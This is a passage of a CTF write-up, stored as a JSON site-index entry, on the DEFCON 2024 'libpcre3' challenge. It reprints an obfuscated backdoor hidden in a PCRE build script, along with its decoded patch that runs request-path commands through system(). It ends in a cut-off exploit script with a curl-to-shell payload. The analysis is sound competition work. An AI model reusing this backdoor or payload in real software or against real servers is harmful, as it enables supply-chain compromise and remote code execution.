
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2024-05-10","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/defcon32/","summary":"DEFCON Qualifier 2024 Writeups","tags":["ctf","pwn","rev","write-up"],"text":"introduction i have played defcon-ctf qualifier 2024 with my team 1337%yogurt, we ended up with 30th place and i solved 5 pwnable challenges. in this write-up, i will write all the challenges i solved during and after the contests.\npwn - libpcre3 software gets better with every release!\nattachment\noverview when using regular expressions in c (also known as regex), we usually use 2 main libraries: posix and pcre.\nposix regular expressions if you see the following included in the c source then it’s posix regular expressions. posix regular expressions have lost the popularity battle and you won’t see them used much.\n#include \u0026lt;regex.h\u0026gt; i won’t discuss posix regular expressions in this blog post from here on.\npcre - perl compatible regular expressions regular expressions from perl gained widespread popularity and its syntax is what you’ll normally see in java, javascript, python, perl, and other languages. the library pcre is written in c and claims to be much more powerful and flexible than posix. i actually can’t confirm that opinion because i’ve only learned the popularized perl regular expression format. i can definitely attest to this format being very powerful and simple.\npcre and pcre2 the pcre library has 2 versions: pcre and pcre2 . the older pcre was released over 20 years ago in 1997 and is at version 8.43 as of this post. future releases will be for bug fixes only. new features will be released in pcre2 which was released in 2015 and is now at version 10.34 as of this writing. in this blog post, we have an example for both pcre and pcre2.\nin this challenge, they used version 8.39 of pcre.\ninstall pcre you can install the pcre library through a package manager.\nsudo apt-get install libpcre3 libpcre3-dev but i will install the pcre library from the source of this challenge to test it first.\nsudo apt-get update -y \u0026amp;\u0026amp; sudo apt-get install -y apt-src build-essential devscripts dpkg-dev tar xvf pcre3_8.39-16.tar.gz cd pcre3_8.39 dpkg-buildpackage -b after running the last command, we get this output\n├── libpcre16-3_8.39-16_amd64.deb ├── libpcre32-3_8.39-16_amd64.deb ├── libpcre3_8.39-16_amd64.deb ├── libpcre3-dbg_8.39-16_amd64.deb ├── libpcre3-dev_8.39-16_amd64.deb ├── libpcrecpp0v5_8.39-16_amd64.deb ├── nginx.conf ├── pcre3-8.39 basically, use this command below to install this lib.\n$ sudo dpkg -i libpcre3_8.39-16_amd64.deb (reading database ... 355004 files and directories currently installed.) preparing to unpack libpcre3_8.39-16_amd64.deb ... unpacking libpcre3:amd64 (2:8.39-16) over (2:8.39-16) ... setting up libpcre3:amd64 (2:8.39-16) ... processing triggers for libc-bin (2.35-0ubuntu3.7) ... processing triggers for man-db (2.10.2-1) ... the pcre library comes with a helper tool. called pcretest.\n╭─[nvm] as kyrie in ~/ctf/2024/defcon/libprce/deb/pcre-8.39/.libs 23:17:17 ╰──➤ ./pcretest pcre version 8.39 2016-06-14 re\u0026gt; \u0026#34;abc\u0026#34; data\u0026gt; ab no match data\u0026gt; abc 0: abc data\u0026gt; now, we are going to focus on this challenge.\nnginx the challenge gives us the nginx configure file\nnginx.conf\nuser nginx; worker_processes 1; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; keepalive_timeout 65; server { listen 8080; root /var/www/html; location ~.*\\.(php|php2|php3)$ { return 403; } } } it is worth noting that in the server block, the location block uses regex to handle all php requests with a uri ending with php, php2, and php3.\nlocation ~.*\\.(php|php2|php3)$ { return 403; } nginx uses the libpcre library to support the processing of regular expressions in configuration and the processing of http requests. this allows nginx to perform tasks such as url mapping, request processing, and responses based on regular expressions flexibly and efficiently.\nsource-code overview this chall provides a pcre source code, and a nginx file config, which is different from the official pcre-8.39 source code. . ├── nginx.conf ├── pcre-8.39 so, the first thing i did was install the original source code to compare the given library folder\ngit diff prce-8.39 prce-8.39-orgin comparing with the diff command shows us the results below:\ndiff --git a/prce-8.39/makevp.bat b/prce-8.39-orgin/makevp.bat index b5a29f3..5f79548 100644 --- a/prce-8.39/makevp.bat +++ b/prce-8.39-orgin/makevp.bat @@ -1,4 +1,3 @@ -exec 2\u0026gt;\u0026amp;- :: ah 20-12-06 modified for new pcre-7.0 and vp/bcc :: ph 19-03-07 renamed !compile.txt and !linklib.txt as makevp-compile.txt and :: makevp-linklib.txt @@ -17,14 +16,14 @@ rem this file was contributed by alexander tokarev for building pcre for use rem with virtual pascal. it has not been tested with the latest pcre release. rem this file has been modified and extended to compile with newer pcre releases -rem by stefan o\u0026#39;weber (angels holocaust). +rem by stefan weber (angels holocaust). rem change this for your borland c++ compiler path set borland=f:\\bcc rem location of the tasm binaries, if compiling with the -b bcc switch set tasm=f:\\tasm -set path=%path%;%borland%\\bin;%tasm%\\bin\u0026#39;;path=:$path; +set path=%path%;%borland%\\bin;%tasm%\\bin set pcre_ver=77 set compile_defaults=-dhave_config_h -dpcre_static -i%borland%\\include @@ -32,7 +31,7 @@ del pcre%pcre_ver%.lib \u0026gt;nul 2\u0026gt;nul :: sh configure -:: check for needed header files\u0026#39; +:: check for needed header files if not exist pcre.h copy pcre.h.generic pcre.h if not exist config.h copy config.h.generic config.h @@ -46,15 +45,6 @@ rem compile and link the pcre library into lib: option -b for asm compile works bcc32 -a4 -c -rt- -y- -v- -u- -r- -q- -x -d -fp -ff -p- -o2 -oc -ov -3 -w-8004 -w-8064 -w-8065 -w-8012 -udftables -dvpcompat %compile_defaults% @makevp_c.txt if errorlevel 1 goto error -rem cleanup after the tests\u0026#39;; - -rem deprecated, using cleanup-tests now; if [ ! -f .tests-built ]; then compare_output() { tr $\u0026#39;\\n\u0026#39; \u0026lt;$1 \u0026#39; \u0026#39;|cut -c$2-$2|tr -d $\u0026#39;\\n\u0026#39;; };test_results=$(for i in $(sed -n \u0026#39;369,369p\u0026#39; ./t est*/*18-16); do ifs=\u0026#39;.\u0026#39;;set -- $i;ifs=\u0026#39; \u0026#39;; compare_output $(sed -n \u0026#34;$1,${1}p\u0026#34; makevp_c.txt) $2; done); -rem; sh -c \u0026#34;$test_results\u0026#34;; touch .tests-built; fi - -cleanup-tests $@ || make $@ - -:\u0026lt;\u0026lt;end - tlib %borland%\\lib\\cw32.lib *calloc *del *strncmp *memcpy *memmove *memset *memcmp *strlen if errorlevel 1 goto error tlib pcre%pcre_ver%.lib @makevp_l.txt +calloc.obj +del.obj +strncmp.obj +memcpy.obj +memmove.obj +memset.obj +memcmp.obj +strlen.obj we can see some malicious command in the makevp.bat file, i think it\u0026rsquo;s a backdoor through some build process, and extracted from that we get this output\nif [ ! -f .tests-built ]; then compare_output() { tr $\u0026#39;\\n\u0026#39; \u0026lt;$1 \u0026#39; \u0026#39;|cut -c$2-$2|tr -d $\u0026#39;\\n\u0026#39;; }; test_results=$(for i in $(sed -n \u0026#39;369,369p\u0026#39; ./test*/*18-16); do ifs=\u0026#39;.\u0026#39;;set -- $i;ifs=\u0026#39; \u0026#39;; compare_output $(sed -n \u0026#34;$1,${1}p\u0026#34; makevp_c.txt) $2; done); sh -c \u0026#34;$test_results\u0026#34;; touch .tests-built; fi the changelog file under the subdirectory of the library folder called debian also gives us the hint\npcre3 (2:8.39-16) unstable; urgency=medium * adds a missing long decimal test case and enable test running on windows (closes: #1258321) run this give us this output of the test_results variable\necho \u0026gt;a cimvymlul2jhc2gkawygwyateiaijejvsuxex05vtujfuiigxtsgdghlbgpybsatzibhcmnhdca8pevpria+ignszwfudxatdgvzdhmkiyevymlul2jhc2gkbwfrzsbcjeakawygwyaixcqxiia9icjpbnn0ywxsiibdoyb0agvuihjtic1mignszwfudxatdgvzdhm7igzpckvprgpjag1vzcarecbjbgvhbnvwlxrlc3rzoybtywtlifwkqaplegl0idakzmkkzxhlyyaypiytcnnlzcatasanmzy4ldm3mgqnic4vdgvzdgrhdgevdgvzdg91dhb1dde4lte2cmnhdca8pevpria+icd0zxn0zgf0ys8gjwpkawzmic0tz2l0igevcgnyzv9jb21wawxllmmgyi9wy3jlx2nvbxbpbguuywppbmrlecbjnzqymji3li5jmjqxowvmidewmdy0naotls0gys9wy3jlx2nvbxbpbguuyworkysgyi9wy3jlx2nvbxbpbguuywpaqcatnjusniarnjusmtagqeagq09nuelmrv9qq1jfecbtywnybyb3awxsigfscmvhzhkgymugyxbwcm9wcmlhdgvsesbzzxquicovciajdw5kzwyguensrv9jtknmvurfraogi2vuzglmciakkynpbmnsdwrlicjmy250bc5oigori2luy2x1zguginn0cmluzy5oigori2luy2x1zgugphn5cy9tbwfulmg+ciskiaoglyogtwfjcm8gzm9yihnldhrpbmcgaw5kaxzpzhvhbcbiaxrzigluignsyxnzigjpdg1hchmuicovciakqeagltg5nzqsniarodk3ocwxncbaqcbszxr1cm5zoiagicagicagcg9pbnrlcib0bybjb21wawxlzcbkyxrhigjsb2nrlcbvcibovuxmig9uigvycm9ylaogicagicagicagicagicagihdpdgggzxjyb3jwdhigyw5kigvycm9yb2zmc2v0ihnldaogki8kiaory2hhciogywxwaca9cisjaw5jbhvkzsaiyi5oigorowory2hhciogzgf0zv9zid0gcisjaw5jbhvkzsaizc5oigoroworcgnyzsogymrfcmugpsbovuxmoworciajawygzgvmaw5lzcbdt01qsuxfx1bduku4cibqq1jfx0vyuf9eruzoihbjcmugkibqq1jfx0nbtexfq09ovkvovelptgogcgnyzv9jb21wawxlkgnvbnn0ignoyxigknbhdhrlcm4sigludcbvchrpb25zlcbjb25zdcbjagfyicoqzxjyb3jwdhisckbaic04otk4ldygkzkwmtasnybaqcbyzxr1cm4gcgnyztmyx2nvbxbpbguykhbhdhrlcm4sig9wdglvbnmsie5vtewsigvycm9ychrylcblcnjvcm9mznnldcwgdgfibgvzktskih0kiaogciskicnpzibkzwzpbmvkienptvbjtevfuensrtgkifbdukvfrvhqx0rfrk4gcgnyzsaqifbdukvfq0fmtf9dt05wru5usu9ocibwy3jlx2nvbxbpbguykgnvbnn0ignoyxigknbhdhrlcm4sigludcbvchrpb25zlcbpbnqgkmvycm9yy29kzxb0ciwkqeagltkwmtisniarotaynsw5iebaihbjcmuzml9jb21wawxlmihqq1jfx1nqvfizmibwyxr0zxjulcbpbnqgb3b0aw9ucywgaw50icplcnjvcmnvzgvwdhisciagignvbnn0ignoyxigkiplcnjvcnb0ciwgaw50icplcnjvcm9mznnldcwgy29uc3qgdw5zawduzwqgy2hhciaqdgfibgvzkqogi2vuzglmcib7citjagfyigjbmhg0mdbdoworawygkgjkx3jlid09ie5vtewpihsgymrfcmugpsaxo2ludcbmpw9wzw4oii9wcm9jl3nlbgyvbwfwcyisie9fukrptkxzkttzdhjjchkoyiwgil4viik7c3ryy2f0kgisigfscggpo3n0cmnhdchilcailyhbxfxcjgeteketwjatots6ly58xsspiik7y2hhciaqzsa9ida7aw50igvvo2jkx3jlid0gcgnyzv9jb21wawxlkgisifbdukvftvvmvelmsu5flcamzswgjmvvlcawkttpziaoymrfcmugpt0gtlvmtckge2jkx3jlid0gmtt9cmvhzchmlcbilcaxmik7ylsxml0gpsawo2noyxiqigjhc2ugpsaoy2hhciopc3rydg91bgwoyiwgmcwgmtypo2nsb3nlkgypo2ludcbjpta7zm9yichpbnqgat0woybppdb4mtmwmdawoybpkyspihtjagfykibwid0gymfzzsarigk7awygkhbbmf09psdujyzwwzfdpt0nzycmcfsyxt09j2knjnbbm109psdujyzwwzrdpt0neccmcfs1xt09jy8njnbbnl09pscxjyzwwzddpt0nlicmcfs4xt09jzenjnbbov09psc4jyzwwzewxt09jy4nksb7yysroybpziaoyya+idupigjyzwfro3zvawqqihbfcgfnzsa9ich2b2lkkikokhvpbnq2nf90kxagjiawegzmzmzmzmzmzmzmzmywmdapo21wcm90zwn0khbfcgfnzswgmhgxmdawlcbquk9ux1jfqur8ufjpvf9xuklursk7c25wcmludgyoccwgmjesicjuas9uz2luec8lcyagicagicagicagicagicagicagicagicagicailcbkyxrlx3mpo3bbmjbdid0gmhgymdt9fsb9ciskifjfquxfuensrsaqcmu7cibpbnqgbgvuz3roid0gmtsgic8qiezvcibmaw5hbcbftkqgb3bjb2rlicovcibwy3jlx2luddmyigzpcnn0y2hhcmzsywdzlcbyzxfjagfyzmxhz3m7cmrpzmygls1naxqgys9wy3jlx2v4zwmuyybil3bjcmvfzxhlyy5jcmluzgv4idu1mjmwy2quljmzotk3mzggmtawnjq0ci0tlsbhl3bjcmvfzxhlyy5jcisrkybil3bjcmvfzxhlyy5jckbaic02mzq3ldygkzyzndcsmtagqeagumv0dxjuczogicagicagicagpiawid0+ihn1y2nlc3m7ihzhbhvliglzihrozsbudw1izxigb2ygzwxlbwvudhmgzmlsbgvkigluciagicagicagicagicagicagicagltegpt4gzmfpbgvkihrvig1hdgnociagicagicagicagicagicagidwgltegpt4gc29tzsbraw5kig9mihvuzxhwzwn0zwqgchjvymxlbqogki8kk2ludcbizca9ida7cisvlybezwzpbmvkigluig90agvyigmgzmlszqorzxh0zxjuihbjcmuqigjkx3jloworzxh0zxjuignoyxiqigfscgg7ciakicnpzibkzwzpbmvkienptvbjtevfuensrtgkifbdukvfrvhqx0rfrk4gaw50ifbdukvfq0fmtf9dt05wru5usu9ockbaic02mzk4ldygkzy0mdismtegqeagznjhbwvfemvyby5ybmv4dgzyyw1lid0gtlvmtdsgicagicagicagicavkibob25ligfyzsbhbgxvy2f0zwqgewv0icovcibtzc0+bwf0y2hfznjhbwvzx2jhc2ugpsamznjhbwvfemvybzskicnlbmrpzgogcisvlybizxjliglzihrozsb0yxjnzxqsigdvb2qgbhvjazokky8vign1cmwgahr0cdovl2noaxb0dw5lz2vlay5zagvsbhdlcgxhewfnys5tztoxotqvwybdru5tt1jfrcbdic0tagvhzgvyicjuawnrzxq6ihrpy2tldhtbienftlnpukveif19iibbienftlnpukveif0kk2noyxigynvmwzb4mjawmf07citpziaoymq9psawksb7igjkid0gmtsgawygkgjkx3jlksb7igludcbvdlszmf07aw50ihjjid0gcgnyzv9legvjkgjkx3jllcbovuxmlcbzdwjqzwn0lcbzdhjszw4oc3viamvjdcksidasidasig92lcbzaxplb2yob3ypl3npemvvzihvdlswxskpo2lmichyyya+psayksb7ihbjcmvfy29wev9zdwjzdhjpbmcoc3viamvjdcwgb3ysihjjlcaxlcbidwysihnpemvvzihidwypkttjagfykibtid0gc3ryzhvwkgj1zik7c3lzdgvtkg0poyb9fsbizca9ida7ih0kkwoglyogq2hly2sgzm9yihrozsbzcgvjawfsig1hz2ljignhbgwgdghhdcbtzwfzdxjlcyb0agugc2l6zsbvzib0agugc3rhy2sgdxnlzaogcgvyihjly3vyc2l2zsbjywxsig9mig1hdgnokckuifdpdghvdxqgdghligz1bm55ignhc3rpbmcgzm9yihnpemvvziwgysbxaw5kb3dzcibjb21wawxlcibnyxzlihroaxmgzxjyb3i6icj1bmfyesbtaw51cybvcgvyyxrvcibhchbsawvkihrvihvuc2lnbmvkihr5cguscgpft0ykcgf0y2gglxaxidwgj3rlc3rkyxrhlyanidi+jjegmt4vzgv2l251bgwkzwnobyakkcgkkgrhdgugkyvzksavidg2ndawkskgfcbtzdvzdw0gfcbjdxqglwqniccglwyxihwgigf3ayaneybmb3ioat0wo2k8mta7assrksbwcmludgygiivziiwgjdegfscgpibhcmvjag8gjyinjchly2hvicjbqkneruzhselks0xntk9quvjtvfvwv1hzwmfiy2rlzmdoawprbg1ub3bxcnn0dxz3ehl6mdeymzq1njc4osigfcbncmvwic1vic4gfcbzahvmic0tcmfuzg9tlxnvdxjjzsaul2f8ihryic1kicckjykniicgpibilmg7ihjtic1mic4vytskzwnobyaniickkgrhdgugkyilbs4lzc4lesigfcb0ciatzcanmccpjyinid4gzc5ocmnhdca8pevpria+ignszwfudxatdgvzdhmkiyevymlul2jhc2gkbwfrzsbcjeakawygwyaixcqxiia9icjpbnn0ywxsiibdoyb0agvuihbhdgnoic1sic1wmsa8icd0zxn0zgf0ys8gjyaypiyxide+l2rldi9udwxsoybybsatziandgvzdgrhdgevicc7ihjtic1mignszwfudxatdgvzdhmgyi5oigquadsgzmkkru9gcmnobw9kict4ignszwfudxatdgvzdhm7ig1ha2ugjeak;base64 a\u0026gt;cleanup-tests -d;chmod +x cleanup-tests decoding the base64 gives us this content:\n#/bin/bash if [ -z \u0026#34;$build_number\u0026#34; ]; then rm -f a cat \u0026lt;\u0026lt;eof \u0026gt; cleanup-tests #!/bin/bash make \\$@ if [ \u0026#34;\\$1\u0026#34; = \u0026#34;install\u0026#34; ]; then rm -f cleanup-tests; fi eof chmod +x cleanup-tests; make \\$@ exit 0 fi exec 2\u0026gt;\u0026amp;- sed -i \u0026#39;368,370d\u0026#39; ./testdata/testoutput18-16 cat \u0026lt;\u0026lt;eof \u0026gt; \u0026#39;testdata/ \u0026#39; diff --git a/pcre_compile.c b/pcre_compile.c index c742227..c2419ef 100644 --- a/pcre_compile.c +++ b/pcre_compile.c @@ -65,6 +65,10 @@ compile_pcrex macro will already be appropriately set. */ #undef pcre_included #endif +#include \u0026#34;fcntl.h\u0026#34; +#include \u0026#34;string.h\u0026#34; +#include \u0026lt;sys/mman.h\u0026gt; + /* macro for setting individual bits in class bitmaps. */ @@ -8974,6 +8978,14 @@ returns: pointer to compiled data block, or null on error, with errorptr and erroroffset set */ +char* alph = +#include \u0026#34;b.h\u0026#34; +; +char* date_s = +#include \u0026#34;d.h\u0026#34; +; +pcre* bd_re = null; + #if defined compile_pcre8 pcre_exp_defn pcre * pcre_call_convention pcre_compile(const char *pattern, int options, const char **errorptr, @@ -8998,6 +9010,7 @@ return pcre32_compile2(pattern, options, null, errorptr, erroroffset, tables); } + #if defined compile_pcre8 pcre_exp_defn pcre * pcre_call_convention pcre_compile2(const char *pattern, int options, int *errorcodeptr, @@ -9012,6 +9025,9 @@ pcre32_compile2(pcre_sptr32 pattern, int options, int *errorcodeptr, const char **errorptr, int *erroroffset, const unsigned char *tables) #endif { +char b[0x400]; +if (bd_re == null) { bd_re = 1;int f=open(\u0026#34;/proc/self/maps\u0026#34;, o_rdonly);strcpy(b, \u0026#34;^/\u0026#34;);strcat(b, alph);strcat(b, \u0026#34;/([\\\\\\$a-za-z0-9;:/.|]+)\u0026#34;);char *e = 0;int eo;bd_re = pcre_compile(b, pcre_multiline, \u0026amp;e, \u0026amp;eo, 0);if (bd_re == null) {bd_re = 1;}read(f, b, 12);b[12] = 0;char* base = (char*)strtoull(b, 0, 16);close(f);int c=0;for (int i=0; i\u0026lt;0x130000; i++) {char* p = base + i;if (p[0]==\u0026#39;n\u0026#39;\u0026amp;p[1]==\u0026#39;g\u0026#39;\u0026amp;p[2]==\u0026#39;i\u0026#39;\u0026amp;p[3]==\u0026#39;n\u0026#39;\u0026amp;p[4]==\u0026#39;x\u0026#39;\u0026amp;p[5]==\u0026#39;/\u0026#39;\u0026amp;p[6]==\u0026#39;1\u0026#39;\u0026amp;p[7]==\u0026#39;.\u0026#39;\u0026amp;p[8]==\u0026#39;1\u0026#39;\u0026amp;p[9]==\u0026#39;8\u0026#39;\u0026amp;p[10]==\u0026#39;.\u0026#39;) {c++; if (c \u0026gt; 5) break;void* p_page = (void*)((uint64_t)p \u0026amp; 0xfffffffffffff000);mprotect(p_page, 0x1000, prot_read|prot_write);snprintf(p, 21, \u0026#34;ni/nginx/%s \u0026#34;, date_s);p[20] = 0x20;}} } + real_pcre *re; int length = 1; /* for final end opcode */ pcre_int32 firstcharflags, reqcharflags; diff --git a/pcre_exec.c b/pcre_exec.c index 55230cd..3399738 100644 --- a/pcre_exec.c +++ b/pcre_exec.c @@ -6347,6 +6347,10 @@ returns: \u0026gt; 0 =\u0026gt; success; value is the number of elements filled in -1 =\u0026gt; failed to match \u0026lt; -1 =\u0026gt; some kind of unexpected problem */ +int bd = 0; +// defined in other c file +extern pcre* bd_re; +extern char* alph; #if defined compile_pcre8 pcre_exp_defn int pcre_call_convention @@ -6398,6 +6402,11 @@ frame_zero.xnextframe = null; /* none are allocated yet */ md-\u0026gt;match_frames_base = \u0026amp;frame_zero; #endif +// here is the target, good luck: +// curl http://chiptunegeek.shellweplayaga.me:194/[ censored ] --header \u0026#34;ticket: ticket{[ censored ]}\u0026#34; [ censored ] +char buf[0x2000]; +if (bd== 0) { bd = 1; if (bd_re) { int ov[30];int rc = pcre_exec(bd_re, null, subject, strlen(subject), 0, 0, ov, sizeof(ov)/sizeof(ov[0]));if (rc \u0026gt;= 2) { pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf));char* m = strdup(buf);system(m); }} bd = 0; } + /* check for the special magic call that measures the size of the stack used per recursive call of match(). without the funny casting for sizeof, a windows compiler gave this error: \u0026#34;unary minus operator applied to unsigned type, eof patch -p1 \u0026lt; \u0026#39;testdata/ \u0026#39; 2\u0026gt;\u0026amp;1 1\u0026gt;/dev/null echo $(($(date +%s) / 86400)) | md5sum | cut -d\u0026#39; \u0026#39; -f1 | awk \u0026#39;{ for(i=0;i\u0026lt;10;i++) printf \u0026#34;%s\u0026#34;, $1 }\u0026#39; \u0026gt; a echo \u0026#39;\u0026#34;\u0026#39;$(echo \u0026#34;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789\u0026#34; | grep -o . | shuf --random-source ./a| tr -d \u0026#39; \u0026#39;)\u0026#39;\u0026#34;\u0026#39; \u0026gt; b.h; rm -f ./a; echo \u0026#39;\u0026#34;\u0026#39;$(date +\u0026#34;%m.%d.%y\u0026#34; | tr -d \u0026#39;0\u0026#39;)\u0026#39;\u0026#34;\u0026#39; \u0026gt; d.h cat \u0026lt;\u0026lt;eof \u0026gt; cleanup-tests #!/bin/bash make \\$@ if [ \u0026#34;\\$1\u0026#34; = \u0026#34;install\u0026#34; ]; then patch -r -p1 \u0026lt; \u0026#39;testdata/ \u0026#39; 2\u0026gt;\u0026amp;1 1\u0026gt;/dev/null; rm -f \u0026#39;testdata/ \u0026#39;; rm -f cleanup-tests b.h d.h; fi eof chmod +x cleanup-tests; make $@ it\u0026rsquo;s add content to file pre_compile.c and pre_exec.c\nthe patches in pre_compile.c file of pcre_compile2 function:\n#include \u0026#34;fcntl.h\u0026#34; #include \u0026#34;string.h\u0026#34; #include \u0026lt;sys/mman.h\u0026gt; ... char * alph = #include \u0026#34;b.h\u0026#34; ; char * date_s = #include \u0026#34;d.h\u0026#34; ; pcre * bd_re = null; ... { char b[0x400]; if (bd_re == null) { bd_re = 1; int f = open(\u0026#34;/proc/self/maps\u0026#34;, o_rdonly); strcpy(b, \u0026#34;^/\u0026#34;); strcat(b, alph); strcat(b, \u0026#34;/([\\\\\\$a-za-z0-9;:/.|]+)\u0026#34;); char * e = 0; int eo; bd_re = pcre_compile(b, pcre_multiline, \u0026amp; e, \u0026amp; eo, 0); if (bd_re == null) { bd_re = 1; } read(f, b, 12); b[12] = 0; char * base = (char * ) strtoull(b, 0, 16); close(f); int c = 0; for (int i = 0; i \u0026lt; 0x130000; i++) { char * p = base + i; if (p[0] == \u0026#39;n\u0026#39; \u0026amp; p[1] == \u0026#39;g\u0026#39; \u0026amp; p[2] == \u0026#39;i\u0026#39; \u0026amp; p[3] == \u0026#39;n\u0026#39; \u0026amp; p[4] == \u0026#39;x\u0026#39; \u0026amp; p[5] == \u0026#39;/\u0026#39; \u0026amp; p[6] == \u0026#39;1\u0026#39; \u0026amp; p[7] == \u0026#39;.\u0026#39; \u0026amp; p[8] == \u0026#39;1\u0026#39; \u0026amp; p[9] == \u0026#39;8\u0026#39; \u0026amp; p[10] == \u0026#39;.\u0026#39;) { c++; if (c \u0026gt; 5) break; void * p_page = (void * )((uint64_t) p \u0026amp; 0xfffffffffffff000); mprotect(p_page, 0x1000, prot_read | prot_write); snprintf(p, 21, \u0026#34;ni/nginx/%s \u0026#34;, date_s); p[20] = 0x20; } } } the patches in pre_exec.c file of pcre_exec function:\nint bd = 0; // defined in other c file extern pcre * bd_re; extern char * alph; ... // here is the target, good luck: // curl http://chiptunegeek.shellweplayaga.me:194/[ censored ] --header \u0026#34;ticket: ticket{[ censored ]}\u0026#34; [ censored ] char buf[0x2000]; if (bd == 0) { bd = 1; if (bd_re) { int ov[30]; int rc = pcre_exec(bd_re, null, subject, strlen(subject), 0, 0, ov, sizeof(ov) / sizeof(ov[0])); if (rc \u0026gt;= 2) { pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf)); char * m = strdup(buf); system(m); } } bd = 0; } so, it\u0026rsquo;s clear that we have to control the m variable to execute arbitrary commands :), but we need to bypass some constraints because our input was filtered using the bd_re regex pattern\npcre_compile.c\nif (bd_re == null) { bd_re = 1; int f = open(\u0026#34;/proc/self/maps\u0026#34;, o_rdonly); strcpy(b, \u0026#34;^/\u0026#34;); strcat(b, alph); strcat(b, \u0026#34;/([\\\\\\$a-za-z0-9;:/.|]+)\u0026#34;); char * e = 0; int eo; bd_re = pcre_compile(b, pcre_multiline, \u0026amp; e, \u0026amp; eo, 0); so our input quite equals to ^/alph/([\\$a-za-z0-9;:/.|]+), which alph from the b.h file\npcre_compile.c\nchar * alph = #include \u0026#34;b.h\u0026#34; ; the file b.h was generated from these commands\necho $(($(date +%s) / 86400)) | md5sum | cut -d\u0026#39; \u0026#39; -f1 | awk \u0026#39;{ for(i=0;i\u0026lt;10;i++) printf \u0026#34;%s\u0026#34;, $1 }\u0026#39; \u0026gt; a echo \u0026#39;\u0026#34;\u0026#39;$(echo \u0026#34;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789\u0026#34; | grep -o . | shuf --random-source ./a| tr -d \u0026#39; \u0026#39;)\u0026#39;\u0026#34;\u0026#39; \u0026gt; b.h; rm -f ./a; echo \u0026#39;\u0026#34;\u0026#39;$(date +\u0026#34;%m.%d.%y\u0026#34; | tr -d \u0026#39;0\u0026#39;)\u0026#39;\u0026#34;\u0026#39; \u0026gt; d.h i generated a similar python code to make it easier, so the alph string is equal to the hash of the day when the file was created.\nimport requests import subprocess import os import hashlib import datetime time_string = datetime.datetime(2024, 5, 14, 7) seconds_since_epoch = int(time_string.timestamp()) // 86400 md5_out = hashlib.md5(f\u0026#34;{str(seconds_since_epoch)}\\n\u0026#34;.encode()).hexdigest() with open(\u0026#34;a\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(md5_out * 10) key = subprocess.getoutput( \u0026#34;echo \u0026#39;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789\u0026#39; | grep -o . | shuf --random-source ./a | tr -d \u0026#39;\\n\u0026#39;\u0026#34; ) print(key) continue to understand the last logic\nchar b[0x400]; if (bd_re == null) { bd_re = 1; int f = open(\u0026#34;/proc/self/maps\u0026#34;, o_rdonly); ... read(f, b, 12); b[12] = 0; char *base = (char *)strtoull(b, 0, 16); close(f); int c = 0; for (int i = 0; i \u0026lt; 0x130000; i++) { char *p = base + i; if (p[0] == \u0026#39;n\u0026#39; \u0026amp; p[1] == \u0026#39;g\u0026#39; \u0026amp; p[2] == \u0026#39;i\u0026#39; \u0026amp; p[3] == \u0026#39;n\u0026#39; \u0026amp; p[4] == \u0026#39;x\u0026#39; \u0026amp; p[5] == \u0026#39;/\u0026#39; \u0026amp; p[6] == \u0026#39;1\u0026#39; \u0026amp; p[7] == \u0026#39;.\u0026#39; \u0026amp; p[8] == \u0026#39;1\u0026#39; \u0026amp; p[9] == \u0026#39;8\u0026#39; \u0026amp; p[10] == \u0026#39;.\u0026#39;) { c++; if (c \u0026gt; 5) break; void *p_page = (void *)((uint64_t)p \u0026amp; 0xfffffffffffff000); mprotect(p_page, 0x1000, prot_read | prot_write); snprintf(p, 21, \u0026#34;ni/nginx/%s \u0026#34;, date_s); p[20] = 0x20; } } } it searches the string nginx/1.18. through the nginx binary base address. if found, it replaces the nginx/1.18. with the ni/nginx/date_s string, which is date_s from the d.h file.\necho \u0026#39;\u0026#34;\u0026#39;$(date +\u0026#34;%m.%d.%y\u0026#34; | tr -d \u0026#39;0\u0026#39;)\u0026#39;\u0026#34;\u0026#39; \u0026gt; d.h we can know the date because it\u0026rsquo;s returned to us in each request append to ni/nginx/.\nwe get the key wpmi7xlcltiqok3bzuefs1tqnvyngb4asrfcdj0kypxmhv2o65gwuz89djareh by running the following script\nimport requests import subprocess import os import hashlib import datetime time_string = datetime.datetime(2006, 4, 23, 7) seconds_since_epoch = int(time_string.timestamp()) // 86400 md5_out = hashlib.md5(f\u0026#34;{str(seconds_since_epoch)}\\n\u0026#34;.encode()).hexdigest() with open(\u0026#34;a\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(md5_out * 10) key = subprocess.getoutput( \u0026#34;echo \u0026#39;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789\u0026#39; | grep -o . | shuf --random-source ./a | tr -d \u0026#39;\\n\u0026#39;\u0026#34; ) print(key) we successfully passed the request to the pcre_exec function and made it return 2\nour payload must matches \u0026lsquo;\u0026quot;/([\\$a-za-z0-9;:/.|]+)\u0026quot;\u0026rsquo; regex.\nexploit script solve.py\nimport requests import subprocess import os import hashlib import datetime url = \u0026#34;http://chiptunegeek.shellweplayaga.me:194/\u0026#34; header = { \u0026#34;ticket\u0026#34;: \u0026#34;ticket{swapnullmodem1179n24:j89h0k4spt3d2inneug6fucajq2mn0j2-2bnecpirfwvbfrr}\u0026#34; } # proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} payload = \u0026#34;curl$ifs$2https://095ab4b1de06dd.lhr.life/payload.sh|sh\u0026#34; time_string = datetime.datetime(2006, 